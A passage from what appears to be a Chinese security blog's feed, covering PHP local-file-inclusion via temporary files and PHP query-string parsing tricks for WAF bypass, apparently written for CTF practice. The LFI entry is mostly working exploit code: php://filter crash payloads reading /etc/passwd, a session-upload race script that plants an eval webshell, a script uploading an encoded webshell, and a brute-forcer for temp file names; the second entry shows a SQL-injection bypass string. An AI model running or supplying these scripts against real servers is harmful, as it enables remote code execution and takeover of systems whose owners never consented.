phpipfn(o;)|/</span>resource=tyskill.php<br></code></pre></td></tr></table></figure><p><a href="https://www.freebuf.com/articles/web/266565.html">探索php伪协议以及死亡绕过 - FreeBuf网络安全行业门户</a> </p><p><a href="https://tyskill.github.io/posts/php_filter_%E8%BF%87%E6%BB%A4%E5%99%A8/">php:&#x2F;&#x2F;filter过滤器学习记录 | tyskillのBlog</a></p><p><a href="https://blog.csdn.net/qq_44657899/article/details/109300335">(56条消息) php:&#x2F;&#x2F;filter的各种过滤器_天问_Herbert555的博客-CSDN博客_php:&#x2F;&#x2F;filter rot13</a> </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP变量覆盖漏洞</title>
    <link href="/Decemberus.github-io/2022/02/19/PHP%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E6%9C%BA%E5%88%B6%E4%B8%8E%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <url>/Decemberus.github-io/2022/02/19/PHP%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E6%9C%BA%E5%88%B6%E4%B8%8E%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%9D%E8%80%83/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP临时文件机制与利用的思考"><a href="#PHP临时文件机制与利用的思考" class="headerlink" title="PHP临时文件机制与利用的思考"></a>PHP临时文件机制与利用的思考</h1><h1 id="PHPLFI"><a href="#PHPLFI" class="headerlink" title="PHPLFI"></a>PHPLFI</h1><p>PHP LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。</p><p>假如在服务器上找不到我们可以包含的文件，那该怎么办，此时可以通过利用一些技巧让服务存储我们恶意生成的临时文件，该临时文件包含我们构造的的恶意代码，此时服务器就存在我们可以包含的文件。</p><p>目前，常见的两种临时文件包含漏洞利用方法主要是：<code>PHPINFO()</code> and <code>PHP7 Segment Fault</code>，利用这两种奇技淫巧可以向服务器上传文件同时在服务器上生成恶意的临时文件，然后将恶意的临时文件包含就可以达到任意代码执行效果也就可以拿到服务器权限进行后续操作。</p><h1 id="了解PHP临时文件"><a href="#了解PHP临时文件" class="headerlink" title="了解PHP临时文件"></a>了解PHP临时文件</h1><p>在PHP中可以使用POST方法或者PUT方法进行文本和二进制文件的上传。<br>上传后会文件会保存在全局变量$_FILES里，该数组包含了所有上传文件的文件信息。</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs inform7">$_FILES<span class="hljs-comment">[‘userfile’]</span><span class="hljs-comment">[‘name’]</span> 客户端文件的原名称。<br>$_FILES<span class="hljs-comment">[‘userfile’]</span><span class="hljs-comment">[‘type’]</span> 文件的 MIME 类型，如果浏览器提供该信息的支持，例如”image/gif”。<br>$_FILES<span class="hljs-comment">[‘userfile’]</span><span class="hljs-comment">[‘size’]</span> 已上传文件的大小，单位为字节。<br>$_FILES<span class="hljs-comment">[‘userfile’]</span><span class="hljs-comment">[‘tmp_name’]</span> 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。<br>$_FILES<span class="hljs-comment">[‘userfile’]</span><span class="hljs-comment">[‘error’]</span> 该文件上传的错误代码，上传成功其值为0，否则为错误信息。<br>$_FILES<span class="hljs-comment">[‘userfile’]</span><span class="hljs-comment">[‘tmp_name’]</span> 文件被上传后在服务端存储的临时文件名<br></code></pre></td></tr></table></figure><p>这里的重点就是<code>$_FILES[‘userfile’][‘tmp_name’]</code> 这个变量。</p><h2 id="临时文件的存储目录"><a href="#临时文件的存储目录" class="headerlink" title="临时文件的存储目录"></a>临时文件的存储目录</h2><p>文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由php.ini的upload_tmp_dir属性指定，假如upload_tmp_dir的路径不可写，PHP会上传到系统默认的临时目录中，假如开启了open_basedir，要想成功上传，系统默认临时目录需要指定PHP可访问。</p><p>在wamp中，upload_tmp_dir属性默认为wamp安装目录下的tmp文件夹：</p><p><img src="D:\mdimage\t011f9d1089d0559dd4.png" alt="wamp临时目录"> </p><blockquote><p>WAMP是Windows下的Apache+Mysql&#x2F;MariaDB+Perl&#x2F;PHP&#x2F;Python的缩写</p></blockquote><p>在Centos7中，upload_tmp_dir没有指定，所以会使用系统默认临时目录，这里是&#x2F;tmp目录，该属性可以通过sys_get_temp_dir()函数来获得</p><p><img src="D:\mdimage\image-20221011194917889.png" alt="image-20221011194917889"> </p><h2 id="临时文件的命名规则"><a href="#临时文件的命名规则" class="headerlink" title="临时文件的命名规则"></a>临时文件的命名规则</h2><p>在上传存储到临时目录后，临时文件命名的规则如下:</p><p>默认为 php+4或者6位随机数字和大小写字母</p><p>php[0-9A-Za-z]{3,4,5,6}</p><p>比如 ：phpXXXXXX.tmp 在windows下有tmp后缀，linux没有。</p><p>windows下，在windows环境中，php会调用GetTempFileName方法，具体定义在源码的php_open_temporary_file.c中</p><p><img src="D:\mdimage\t018e8f64ce52f4be7f.png" alt="windows文件命名"> </p><p>在linux下则是适用mkstemp方法，此方法依赖于glibc的编译方式，通常生成6位随机数，范围为62（A-Za-z0-9）</p><p><img src="D:\mdimage\t015a2d67e3293214bc.png" alt="linux下文件名"> </p><p><img src="D:\mdimage\t01faaa80caff6c36c7.png" alt="linux下文件命名"> </p><h2 id="临时文件的正常存活周期"><a href="#临时文件的正常存活周期" class="headerlink" title="临时文件的正常存活周期"></a>临时文件的正常存活周期</h2><p><img src="D:\mdimage\t01f616deba6a4cfb62.png" alt="临时文件正常的存货周期"> </p><p>上面这张图是PHP在通过POST方法上传文件时的运行周期图，可以看到我们临时文件的存活周期就是上图红色框中的时间段。另外，如果在php运行的过程中，假如php非正常结束，比如崩溃，那么这个临时文件就会永久的保留。如果php正常的结束，并且该文件没有被移动到其它地方也没有被改名，则该文件将在表单请求结束时被删除。</p><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>既然了解了PHP上传会产生临时文件，并且文件内容可控，那我们就不禁要思考思考，这里有没有存在可以利用的点呢？</p><p>这就有以下几个问题：</p><h2 id="问题一：如何能够访问到该临时文件？"><a href="#问题一：如何能够访问到该临时文件？" class="headerlink" title="问题一：如何能够访问到该临时文件？"></a>问题一：如何能够访问到该临时文件？</h2><p>由于临时文件目录一般不可访问，因此想要利用临时文件一般需要配合文件包含，或者某些ssrf结合包含来进行利用。</p><h2 id="问题二：如何获得临时文件的文件名？"><a href="#问题二：如何获得临时文件的文件名？" class="headerlink" title="问题二：如何获得临时文件的文件名？"></a>问题二：如何获得临时文件的文件名？</h2><p>1.在前面介绍过临时文件的命名规则，因此，当我们获得了一个文件包含点时，可以通过暴力猜解文件名来得到。这时最朴素，最笨拙的方法，但也是最有效的方法。</p><p>2.在windows中，利用了FindFirstFile方法，可以通过通配符来进行文件包含，在linux中也有相应的一些方法。</p><p>3.第三种方法就是通过&#x2F;proc&#x2F;self&#x2F;fd&#x2F;xxx来获得，xxx从10开始，这里获得的时当前运行进程ID的一些符号链接，这个方式的有效性取决于上传文件的大小，大文件可以增加尝试的时间。</p><p>获得文件名的方法应该有很多，这里只列举最笨拙的几种</p><h2 id="如何在php运行时间内包含到该临时文件？"><a href="#如何在php运行时间内包含到该临时文件？" class="headerlink" title="如何在php运行时间内包含到该临时文件？"></a>如何在php运行时间内包含到该临时文件？</h2><p>1.本地文件包含可以让php包含自身从而导致死循环，然后php守护进程产生内存溢出，然后php会崩溃，php自身是不会因为错误直接退出的，它会清空自己的内存堆栈，以便从错误中恢复，这就保证了web服务的正常运转的同时，打断了php对临时文件的处理，在这个时候对任一php文件进行post文件请求，临时文件就会被保留。</p><p>正常的执行流程应该如下图所示：</p><p><img src="D:\mdimage\t01610a5c5cd09be792.png" alt="正常执行流程"> </p><p>而在漏洞利用过程中：</p><p><img src="D:\mdimage\t01aa94dbe78929b207.png" alt="漏洞利用流程"> </p><p>因此临时目录下的临时文件有部分得以保存，再通过包含这部分文件即可getshell。</p><h2 id="php-x2F-x2F-filter-x2F-string-strip-tags"><a href="#php-x2F-x2F-filter-x2F-string-strip-tags" class="headerlink" title="php:&#x2F;&#x2F;filter&#x2F;string.strip_tags"></a>php:&#x2F;&#x2F;filter&#x2F;string.strip_tags</h2><p>php7.0的bug</p><p>payload如下，在有文件包含的文件下用</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">include.php?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.strip_tags/</span>resource=<span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><p>使用php:&#x2F;&#x2F;filter&#x2F;string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell</p><p>该方法仅适用于以下php7版本，php5并不存在该崩溃：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">• php<span class="hljs-number">7.0.0-7</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>可以利用， <span class="hljs-number">7</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>x版本的已被修复<br><br>• php<span class="hljs-number">7.1.3-7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span>可以利用， <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span>x版本的已被修复<br><br>• php<span class="hljs-number">7.2.2-7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">8</span>可以利用， <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">9</span>一直到<span class="hljs-number">7</span>.<span class="hljs-number">3</span>到现在的版本已被修复<br></code></pre></td></tr></table></figure><h2 id="convert-quoted-printable-encode"><a href="#convert-quoted-printable-encode" class="headerlink" title="convert.quoted-printable-encode"></a>convert.quoted-printable-encode</h2><p>3.利用wupco师傅发现的filter:<code>convert.quoted-printable-encode</code>导致的segment fault。实际上，这个崩溃并不适用于include，require等函数，经过测试，该方法适用于以下版本（201812月以前的版本，由于师傅提交了因此之后的版本修复了，tql）的以下函数（file函数，file_get_contents函数，readfile函数）：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">• php<span class="hljs-number">7.0.0-7</span>.<span class="hljs-number">0</span>.<span class="hljs-number">32</span><br><br>• php<span class="hljs-number">7.0.4-7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">12</span><br><br>• php&lt;=<span class="hljs-number">5</span>.<span class="hljs-number">6</span>.<span class="hljs-number">38</span>的版本<br></code></pre></td></tr></table></figure><p>这里要说明下5.6.39-5.6.9以内的版本并不存在这个崩溃</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">php:</span>//<span class="hljs-keyword">filter</span>/convert.quoted-printable-encode/resource<span class="hljs-operator">=</span>data://<span class="hljs-punctuation">,</span><span class="hljs-variable">%bfAAAAAAAAAAAAAAAAAAAAAAA</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ffAAAAAAAAAAAAAAAAAAAAAAAA</span><br></code></pre></td></tr></table></figure><p>例题的话可以去看buu上找npu又个叫ezclude的题</p><p><a href="https://www.anquanke.com/post/id/183046?from=groupmessage">PHP临时文件机制与利用的思考-安全客 - 安全资讯平台 (anquanke.com)</a></p><h1 id="实战攻击"><a href="#实战攻击" class="headerlink" title="实战攻击"></a>实战攻击</h1><h2 id="session对话进行文件包含"><a href="#session对话进行文件包含" class="headerlink" title="session对话进行文件包含"></a>session对话进行文件包含</h2><p>向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</p><p>大佬的写入shell脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br>host = <span class="hljs-string">&#x27;http://de198dd7-5ee5-4fae-a188-83bc584d65a9.node4.buuoj.cn:81/flflflflag.php&#x27;</span><br>sessid = <span class="hljs-string">&#x27;vrh&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">POST</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>        session.post(<br>            host,<br>            data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="hljs-string">&quot;&lt;?php system(&#x27;cat *&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);echo md5(&#x27;1&#x27;);?&gt;&quot;</span>&#125;,<br>            files=&#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&#x27;a.txt&#x27;</span>, f)&#125;,<br>            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;<br>        )<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">READ</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        response = session.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;host&#125;</span>?file=/tmp/sess_<span class="hljs-subst">&#123;sessid&#125;</span>&#x27;</span>)<br>        <span class="hljs-comment"># print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-comment"># if &#x27;flag&#x27; not in response.text:</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+++]retry&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(response.text)<br>            sys.exit(<span class="hljs-number">0</span>)<br><br><br><span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>    t1 = threading.Thread(target=POST, args=(session, ))<br>    t1.daemon = <span class="hljs-literal">True</span><br>    t1.start()<br>    READ(session)<br><br></code></pre></td></tr></table></figure><h2 id="php7-segment-fault"><a href="#php7-segment-fault" class="headerlink" title="php7 segment fault"></a>php7 segment fault</h2><p>向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">import requests<br><span class="hljs-keyword">from</span> io import BytesIO<br>url=<span class="hljs-string">&quot;http://f0af8aa4-9e9c-40a8-9003-175dbc6f69f8.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span><br>payload=<span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span><br>files=&#123;<br>    <span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-title function_ invoke__">BytesIO</span>(payload.<span class="hljs-title function_ invoke__">encode</span>())<br>&#125;<br>r=requests.<span class="hljs-title function_ invoke__">post</span>(url=url,files=files,allow_redirects=False)<br><br><span class="hljs-keyword">print</span>(r.text)<br><br></code></pre></td></tr></table></figure><p>找到文件包含的地方，写文件，爆破临时文件名，写入shell</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，<span class="hljs-keyword">POST</span>的临时文件就会被保留<br></code></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/linuxsec/articles/11278477.html">具体原理在这里</a>    </p><p><a href="https://blog.csdn.net/weixin_46081055/article/details/120204436?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link">那两种新方式的例题在这呀</a></p><p>或者也可以用下面这一个组合</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> itertools<br><br>charset = string.digits + string.letters<br><br>host = <span class="hljs-string">&quot;192.168.43.155&quot;</span><br>port = <span class="hljs-number">80</span><br>base_url = <span class="hljs-string">&quot;http://%s:%d&quot;</span> % (host, port)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file_to_include</span>(<span class="hljs-params">url, file_content</span>):<br>    files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;evil.jpg&#x27;</span>, file_content, <span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br>    <span class="hljs-keyword">try</span>:<br>        response = requests.post(url, files=files)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span> e<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_tmp_files</span>():<br>    webshell_content = <span class="hljs-string">&#x27;&lt;?php eval($_REQUEST[c]);?&gt;&#x27;</span>.encode(<br>        <span class="hljs-string">&quot;base64&quot;</span>).strip().encode(<span class="hljs-string">&quot;base64&quot;</span>).strip().encode(<span class="hljs-string">&quot;base64&quot;</span>).strip()<br>    file_content = <span class="hljs-string">&#x27;&lt;?php if(file_put_contents(&quot;/tmp/ssh_session_HD89q2&quot;, base64_decode(&quot;%s&quot;)))&#123;echo &quot;flag&quot;;&#125;?&gt;&#x27;</span> % (<br>        webshell_content)<br>    phpinfo_url = <span class="hljs-string">&quot;%s/include.php?f=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span> % (<br>        base_url)<br>    length = <span class="hljs-number">6</span><br>    times = <span class="hljs-built_in">len</span>(charset) ** (length / <span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(times):<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] %d / %d&quot;</span> % (i, times)<br>        upload_file_to_include(phpinfo_url, file_content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    generate_tmp_files()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>charset = string.digits + string.letters<br><br>host = <span class="hljs-string">&quot;192.168.43.155&quot;</span><br>port = <span class="hljs-number">80</span><br>base_url = <span class="hljs-string">&quot;http://%s:%d&quot;</span> % (host, port)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">brute_force_tmp_files</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> charset:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> charset:<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> charset:<br>                <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> charset:<br>                    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> charset:<br>                        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> charset:<br>                            filename = i + j + k + l + m + n<br>                            url = <span class="hljs-string">&quot;%s/include.php?f=/tmp/php%s&quot;</span> % (<br>                                base_url, filename)<br>                            <span class="hljs-built_in">print</span> url<br>                            <span class="hljs-keyword">try</span>:<br>                                response = requests.get(url)<br>                                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> response.content:<br>                                    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Include success!&quot;</span><br>                                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>                            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                                <span class="hljs-built_in">print</span> e<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    brute_force_tmp_files()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>第一个脚本是写临时文件令其崩溃的，第二个是爆破临时文件的</p><p><a href="https://www.jianshu.com/p/dfd049924258">LFI via SegmentFault - 简书 (jianshu.com)</a></p><p><a href="https://www.anquanke.com/post/id/201136#h3-8">PHP LFI 利用临时文件 Getshell 姿势-安全客 - 安全资讯平台 (anquanke.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP字符串解析</title>
    <link href="/Decemberus.github-io/2022/02/17/%E5%88%A9%E7%94%A8PHP%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7Bypass/"/>
    <url>/Decemberus.github-io/2022/02/17/%E5%88%A9%E7%94%A8PHP%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7Bypass/</url>
    
    <content type="html"><![CDATA[<h1 id="利用PHP的字符串解析特性Bypass"><a href="#利用PHP的字符串解析特性Bypass" class="headerlink" title="利用PHP的字符串解析特性Bypass"></a>利用PHP的字符串解析特性Bypass</h1><p>参考这篇文章：<a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>我们知道PHP将查询字符串（在URL或正文中）转换为内部<code>$_GET</code>或的关联数组<code>$_POST</code>。例如：&#x2F;?foo&#x3D;bar变成Array([foo] &#x3D;&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，&#x2F;?%20news[id%00&#x3D;42会转换为Array([news_id] &#x3D;&gt; 42)。如果一个IDS&#x2F;IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">/<span class="hljs-keyword">new</span><span class="hljs-type">s</span>.php?%<span class="hljs-number">20</span><span class="hljs-keyword">new</span><span class="hljs-type">s</span>[id%<span class="hljs-number">00</span>=<span class="hljs-number">42</span><span class="hljs-string">&quot;+AND+1=0--</span><br></code></pre></td></tr></table></figure><p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p><p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p><p>​    1.删除空白符</p><p>​    2.将某些字符转换为下划线（包括空格）</p><p>例如：</p><table><thead><tr><th align="center">User input</th><th align="center">Decoded PHP</th><th align="center">variable name</th></tr></thead><tbody><tr><td align="center">%20foo_bar%00</td><td align="center">foo_bar</td><td align="center">foo_bar</td></tr><tr><td align="center">foo%20bar%00</td><td align="center">foo bar</td><td align="center">foo_bar</td></tr><tr><td align="center">foo%5bbar</td><td align="center">foo[bar</td><td align="center">foo_bar</td></tr></tbody></table><p>通过以下这个示例，你可以更直观的看到parser_str函数如何处理字符串：</p><p><img src="D:\mdimage\1567560394_5d6f12cab5cdc.gif" alt="img"> </p><p>parse_str函数通常被自动应用于get、post请求和cookie中。如果你的Web服务器接受带有特殊字符的参数名，那么也会发生类似的情况。下面将介绍php解析函数如何处理这些特殊字符</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>.<span class="hljs-selector-attr">[1st]</span>foo_bar<br><span class="hljs-number">2</span><span class="hljs-selector-class">.foo</span><span class="hljs-selector-attr">[2nd]</span>bar<br><span class="hljs-number">3</span><span class="hljs-selector-class">.foo_bar</span><span class="hljs-selector-attr">[3rd]</span><br></code></pre></td></tr></table></figure><p><img src="D:\mdimage\1567560438_5d6f12f680afe.jpeg" alt="img">  </p><p><img src="D:\mdimage\1567560448_5d6f13004035f.jpeg" alt="img"> </p><p>从上面的图里可以看出匹配机制</p><p>可以看出，foo%20bar和foo+bar等效，均解析为foo bar。</p><h1 id="Suricata"><a href="#Suricata" class="headerlink" title="Suricata"></a>Suricata</h1>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP变量覆盖漏洞</title>
    <link href="/Decemberus.github-io/2022/01/09/%E6%B5%85%E8%B0%88PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%AD%E5%87%BA%E7%8E%B0%E8%BF%87%E6%BB%A4%E9%99%90%E5%88%B6%E7%9A%84%E7%BB%95%E8%BF%87%E6%89%A7%E8%A1%8C%E6%96%B9%E6%B3%95/"/>
    <url>/Decemberus.github-io/2022/01/09/%E6%B5%85%E8%B0%88PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%AD%E5%87%BA%E7%8E%B0%E8%BF%87%E6%BB%A4%E9%99%90%E5%88%B6%E7%9A%84%E7%BB%95%E8%BF%87%E6%89%A7%E8%A1%8C%E6%96%B9%E6%B3%95/</url>
    
